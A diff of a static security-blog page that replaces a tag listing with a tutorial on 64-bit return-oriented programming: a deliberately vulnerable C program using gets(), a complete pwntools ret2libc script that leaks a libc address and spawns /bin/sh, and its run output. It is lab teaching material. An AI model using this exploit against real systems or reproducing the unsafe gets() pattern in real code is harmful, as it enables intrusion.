@@ -4,7 +4,7 @@
          
         <meta charset="utf-8">
         <meta name="viewport" content="width=device-width, initial-scale=1">
-        <title>Elf</title>
+        <title>Rop Example</title>
         
         <style>
 
@@ -61,9 +61,6 @@
 <script>$(document).on('click', function() { $('.collapse').collapse('hide'); })</script>
  <meta name="generator" content="Hugo 0.54.0" />
         
-        <link href="/tags/elf/index.xml" rel="alternate" type="application/rss&#43;xml" title="Master 0xCcC" />
-        <link href="/tags/elf/index.xml" rel="feed" type="application/rss&#43;xml" title="Master 0xCcC" />
-        
 
         
     </head>
@@ -83,7 +80,7 @@
 
                 <div class="navbar-header">
 
-                    <a class="navbar-brand visible-xs" href="#">Elf</a>
+                    <a class="navbar-brand visible-xs" href="#">Rop Example</a>
 
                     <button class="navbar-toggle" data-target=".navbar-collapse" data-toggle="collapse">
                         <span class="icon-bar"></span>
@@ -128,9 +125,7 @@
 
 <main>
 
-    <h2>Elf</h2>
-
-     <div class="item">
+    <div class="item">
 
     
     
@@ -154,109 +149,154 @@
     
 
 </div>
-  <div class="item">
 
-    
-    
-    
 
-    
-    
+    <br> <div class="text-justify">
 
-    <h4><a href="/memo/asmx86args/">x86 Args and local vars</a></h4>
-    <h5>August 7, 2019</h5>
-    
-    <a href="https://masterccc.github.io/tags/elf"><kbd class="item-tag">ELF</kbd></a>
-    
-    <a href="https://masterccc.github.io/tags/gdb"><kbd class="item-tag">gdb</kbd></a>
-    
-    <a href="https://masterccc.github.io/tags/assembly"><kbd class="item-tag">assembly</kbd></a>
-    
-    <a href="https://masterccc.github.io/tags/x86"><kbd class="item-tag">x86</kbd></a>
-    
-    <a href="https://masterccc.github.io/tags/linux"><kbd class="item-tag">linux</kbd></a>
-    
+<h1 id="rop-x86-64">ROP x86_64</h1>
 
+<ul>
+<li>Local</li>
+<li>gets()</li>
+<li>x86_64</li>
+<li>No setuid()</li>
+<li>No canary</li>
+</ul>
+
+<h2 id="source-code">Source code</h2>
+
+<pre><code>#include &lt;stdio.h&gt;
+
+int main() {
+    char buffer[32];
+    puts(&quot;Simple ROP.\n&quot;);
+    gets(buffer);
+    return 0;
+}
+</code></pre>
+
+<h3 id="compilation">Compilation</h3>
+
+<pre><code>gcc -o vuln vuln.c -fno-stack-protector  -no-pie
+</code></pre>
+
+<pre><code>$file vuln
+vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=20e082fc91a594a5d0a331e84688a0d62b3b7b56, not stripped
+</code></pre>
+
+<h2 id="rop-script">ROP script</h2>
+
+<pre><code># coding: utf-8
+from pwn import *
+
+# Choose and run
+p = process(&quot;./vuln&quot;)
+
+# Inspect files
+binary = ELF(&quot;./vuln&quot;)
+libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
+
+# Get gadgets from binary
+binary_gadgets = ROP(binary)
+
+# Get a &quot;pop rdi&quot; (first param goes to rdi)
+POP_RDI = (binary_gadgets.find_gadget(['pop rdi', 'ret']))[0]
+# or ROPgadget --binary vuln | grep &quot;pop rdi&quot;
+
+# RET = (binary_gadgets.find_gadget(['ret']))[0]
+
+# Get puts plt address to exec put()
+plt_puts = binary.plt['puts']
+
+# Get main address to exec main()
+plt_main = binary.symbols['main']
+
+# Get got puts for the leak addr
+got_puts = binary.got['puts']
+
+
+junk = &quot;A&quot; * 40      # Fill buffer
+
+rop = junk
+rop += p64(POP_RDI)  # Put next line as first param
+rop += p64(got_puts) # Param
+rop += p64(plt_puts) # Exec puts()
+rop += p64(plt_main) # Restart main()
+
+p.sendlineafter(&quot;ROP.&quot;, rop)
+
+p.recvline()
+p.recvline()
+
+# Get and parse leaked address
+recieved = p.recvline().strip()
+leak = u64(recieved.ljust(8, &quot;\x00&quot;))
+log.info(&quot;Leaked lib puts  : %s&quot;, hex(leak))
+
+# puts offset in libc
+log.info(&quot;libc puts offset : %s&quot;, hex(libc.sym[&quot;puts&quot;]))
+
+# Set lib base address (next sym() calls will rely ont he new address) 
+libc.address = leak - libc.sym[&quot;puts&quot;]
+log.info(&quot;libc start addr  : %s&quot;, hex(libc.address))
+
+
+BINSH = next(libc.search(&quot;/bin/sh&quot;)) # Get /bin/sh addr
+SYSTEM = libc.sym[&quot;system&quot;] # Get system addr
+
+log.info(&quot;bin/sh %s &quot; % hex(BINSH))
+log.info(&quot;system %s &quot; % hex(SYSTEM))
+
+
+rop2 = junk 
+#rop2 += p64(RET)
+rop2 += p64(POP_RDI)
+rop2 += p64(BINSH)
+rop2 += p64(SYSTEM)
+
+p.sendlineafter(&quot;ROP.&quot;, rop2)
+p.interactive()
+</code></pre>
+
+<h2 id="result">Result</h2>
+
+<pre><code>$ python monepx.py 
+[+] Starting local process './vuln': pid 5442
+[*] '/home/heither/exploit/rop_64/vuln'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[*] '/lib/x86_64-linux-gnu/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[*] Loaded cached gadgets for './vuln'
+[*] Leaked lib puts  : 0x7f0f9c3e7910
+[*] libc puts offset : 0x71910
+[*] libc start addr  : 0x7f0f9c376000
+[*] bin/sh 0x7f0f9c4f7519 
+[*] system 0x7f0f9c3ba9c0 
+[*] Switching to interactive mode
+
+
+$ ls
+exploit.py  vuln  vuln.c
+
+</code></pre>
 </div>
-  <div class="item">
-
-    
-    
-    
 
     
     
 
-    <h4><a href="/memo/ld_preload/">LD_PRELOAD trick</a></h4>
-    <h5>July 27, 2019</h5>
-    
-    <a href="https://masterccc.github.io/tags/elf"><kbd class="item-tag">ELF</kbd></a>
-    
-    <a href="https://masterccc.github.io/tags/linux"><kbd class="item-tag">linux</kbd></a>
-    
-    <a href="https://masterccc.github.io/tags/hook"><kbd class="item-tag">hook</kbd></a>
-    
-    <a href="https://masterccc.github.io/tags/instrumentation"><kbd class="item-tag">instrumentation</kbd></a>
-    
-
-</div>
-  <div class="item">
-
-    
-    
     
 
     
-    
-
-    <h4><a href="/reverse/cm_thething/">Crackmes.de - The_thing by prout</a></h4>
-    <h5>July 26, 2019</h5>
-    
-    <a href="https://masterccc.github.io/tags/elf"><kbd class="item-tag">ELF</kbd></a>
-    
-    <a href="https://masterccc.github.io/tags/crackme"><kbd class="item-tag">crackme</kbd></a>
-    
-    <a href="https://masterccc.github.io/tags/assembly"><kbd class="item-tag">assembly</kbd></a>
-    
-    <a href="https://masterccc.github.io/tags/keygen"><kbd class="item-tag">keygen</kbd></a>
-    
-    <a href="https://masterccc.github.io/tags/challenge"><kbd class="item-tag">challenge</kbd></a>
-    
-    <a href="https://masterccc.github.io/tags/linux"><kbd class="item-tag">linux</kbd></a>
-    
-
-</div>
-  <div class="item">
-
-    
-    
-    
-
-    
-    
-
-    <h4><a href="/reverse/cm_0232/">Crackmes.de - crackme.02.32 by geyslan</a></h4>
-    <h5>July 26, 2019</h5>
-    
-    <a href="https://masterccc.github.io/tags/elf"><kbd class="item-tag">ELF</kbd></a>
-    
-    <a href="https://masterccc.github.io/tags/crackme"><kbd class="item-tag">crackme</kbd></a>
-    
-    <a href="https://masterccc.github.io/tags/assembly"><kbd class="item-tag">assembly</kbd></a>
-    
-    <a href="https://masterccc.github.io/tags/keygen"><kbd class="item-tag">keygen</kbd></a>
-    
-    <a href="https://masterccc.github.io/tags/challenge"><kbd class="item-tag">challenge</kbd></a>
-    
-    <a href="https://masterccc.github.io/tags/linux"><kbd class="item-tag">linux</kbd></a>
-    
-
-</div>
- 
 
 </main>
-
-
 
         <footer>
 
